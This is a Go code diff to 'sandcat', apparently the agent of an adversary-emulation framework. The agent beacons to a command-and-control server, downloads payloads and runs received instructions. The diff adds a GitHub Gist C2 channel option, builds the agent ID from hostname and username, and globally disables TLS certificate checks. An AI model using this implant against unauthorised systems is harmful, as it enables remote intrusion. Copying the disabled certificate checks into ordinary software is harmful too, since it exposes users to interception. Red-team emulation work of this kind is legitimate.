@@ -4,20 +4,23 @@ import (
 	"crypto/tls"
 	"flag"
 	"fmt"
-	"math/rand"
 	"net/http"
 	"os"
 	"os/user"
 	"reflect"
 	"runtime"
 	"strconv"
-	"time"
+	"strings"
 
 	"./contact"
 	"./execute"
 	"./util"
 	"./output"
 	"./privdetect"
+)
+
+const (
+	gistC2 = "GIST"
 )
 
 /*
@@ -29,6 +32,8 @@ var (
     defaultServer = "http://localhost:8888"
     defaultGroup = "my_group"
     defaultSleep = "60"
+    defaultC2 = "API"
+    githubToken = ""
 )
 
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
@@ -43,7 +48,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				fmt.Printf("[*] Running instruction %s\n", command["id"])
-				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string))
+				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
 				go coms.RunInstruction(command, profile, payloads)
 				util.Sleep(command["sleep"].(float64))
 			}
@@ -53,18 +58,14 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, sleep int, executors []string, privilege string) map[string]interface{} {
+func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
-	rand.Seed(time.Now().UnixNano())
-	pawID := rand.Intn(999999 - 1)
-
+	paw := fmt.Sprintf("%s$%s", host, user.Username)
 	profile := make(map[string]interface{})
-	profile["paw"] = fmt.Sprintf("%d", pawID)
+	profile["paw"] = paw
 	profile["server"] = server
 	profile["group"] = group
-	profile["host"] = host
-	profile["username"] = user.Username
 	profile["architecture"] = runtime.GOARCH
 	profile["platform"] = runtime.GOOS
 	profile["location"] = os.Args[0]
@@ -73,11 +74,17 @@ func buildProfile(server string, group string, sleep int, executors []string, pr
 	profile["ppid"] = strconv.Itoa(os.Getppid())
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
 	profile["privilege"] = privilege
+	profile["c2"] = strings.ToUpper(c2)
 	return profile
 }
 
 func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact {
-	coms, _ := contact.CommunicationChannels["API"]
+	coms, _ := contact.CommunicationChannels[profile["c2"].(string)]
+	if !validC2Configuration(coms, profile["c2"].(string)) {
+		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to API")
+		coms, _ = contact.CommunicationChannels[defaultC2]
+		profile["c2"] = defaultC2
+	}
 	if coms.Ping(profile["server"].(string)) {
 		//go util.StartProxy(profile["server"].(string))
 		return coms
@@ -90,6 +97,15 @@ func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact 
 	return coms
 }
 
+func validC2Configuration(coms contact.Contact, c2 string) bool {
+	switch c2 {
+	case gistC2:
+		return coms.C2RequirementsMet(githubToken)
+	default:
+		return false
+	}
+}
+
 func main() {
 	var executors execute.ExecutorFlags
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
@@ -98,6 +114,7 @@ func main() {
 	sleep := flag.String("sleep", defaultSleep, "Initial sleep value for sandcat (integer in seconds)")
 	delay := flag.Int("delay", 0, "Delay starting this agent by n-seconds")
 	verbose := flag.Bool("v", false, "Enable verbose output")
+	c2 := flag.String("c2", defaultC2, "C2 Channel for agent (API and GIST supported)")
 
 	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
 	flag.Parse()
@@ -111,8 +128,9 @@ func main() {
     output.VerbosePrint(fmt.Sprintf("sleep=%d", sleepInt))
     output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
     output.VerbosePrint(fmt.Sprintf("initial delay=%d", *delay))
+	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", *c2))
 
-	profile := buildProfile(*server, *group, sleepInt, executors, privilege)
+	profile := buildProfile(*server, *group, sleepInt, executors, privilege, *c2)
 	util.Sleep(float64(*delay))
 
 	for {
